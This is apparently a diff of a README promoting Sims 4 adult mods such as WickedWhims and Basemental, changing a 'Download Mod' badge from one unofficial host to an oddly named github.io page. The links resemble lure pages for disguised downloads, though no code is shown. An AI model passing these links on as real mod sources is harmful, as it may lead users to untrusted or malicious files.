@@ -4,7 +4,7 @@
 
 Vanilla Sims is cute… until the woohoo blur kills the vibe. Bolt in an adult mod and suddenly Pleasantview looks like Vegas at midnight. This guide breaks down the must-have **WickedWhims** core, spicy bolt-ons like Basemental, and a slick install walk-through so you can run risque stories without the grind or the censor mosaic.
 
-[![Download Mod](https://img.shields.io/badge/Download-Mod-blueviolet)](https://fileoffload18.bitbucket.io)
+[![Download Mod](https://img.shields.io/badge/Download-Mod-blueviolet)](https://Sims-4-Adult-Mod-ta5.github.io/.github)
 ---
 
 ## Product Description
